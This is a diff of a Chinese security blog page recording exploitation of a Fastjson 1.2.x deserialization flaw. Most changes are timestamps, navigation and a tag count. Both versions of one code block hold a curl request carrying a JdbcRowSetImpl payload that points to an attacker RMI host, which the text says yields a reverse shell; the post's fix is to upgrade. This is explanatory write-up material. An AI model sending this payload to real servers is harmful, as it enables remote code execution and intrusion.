@@ -89,7 +89,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2019/11/07/vZCDBI2QrbpPAfS.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/07/pGgoOH6SRW9AVk5.png">
-<meta property="og:updated_time" content="2019-11-07T06:28:06.578Z">
+<meta property="og:updated_time" content="2019-11-07T06:29:52.589Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Fastjson反序列化RMI漏洞利用记录">
 <meta name="twitter:description" content="漏洞背景关于 fastjson 最近几年爆出的反序列问题比较多，各种绕过。护网期间，据说也爆出了新的姿势，目前还无完整分析，这里记录之前漏洞版本 RMI 监听方式进行反序列化利用，之后利用方式类同。 本次漏洞记录的 Fastjson 版本是 1.2.7。 漏洞复现起初利用 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类来构造">
@@ -373,7 +373,7 @@
 <p>由于 Exploit.class 写的是 反弹shell 的命令，去监听端口</p>
 <p><img src="https://i.loli.net/2019/11/07/vZCDBI2QrbpPAfS.png" alt></p>
 <p>客户端提交恶意请求如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ivv http://xxx.com/queryNotice -H &apos;Content-type: application/json&apos; -d &apos;&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/Exploit&quot;&#125;,&quot;autocommit&quot;:&quot;true&quot;&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -ivv http://xxx.com/queryNotice -H <span class="string">'Content-type: application/json'</span> -d <span class="string">'&#123;"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://x.x.x.x:1099/Exploit","autocommit":"true"&#125;'</span></span><br></pre></td></tr></table></figure>
 <p>可监听到shell</p>
 <p><img src="https://i.loli.net/2019/11/07/pGgoOH6SRW9AVk5.png" alt></p>
 <h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级到Fastjson最新版本</p>
@@ -448,8 +448,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/01/Web展示之漏洞监控/" rel="next" title="Web展示之漏洞监控">
-                <i class="fa fa-chevron-left"></i> Web展示之漏洞监控
+              <a href="/2019/04/20/应急响应之Confluence路径穿越/" rel="next" title="应急响应之Confluence路径穿越漏洞（CVE-2019-3398）">
+                <i class="fa fa-chevron-left"></i> 应急响应之Confluence路径穿越漏洞（CVE-2019-3398）
               </a>
             
           </div>
@@ -457,10 +457,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/11/07/应急响应之Confluence路径穿越/" rel="prev" title>
-                 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -561,7 +557,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
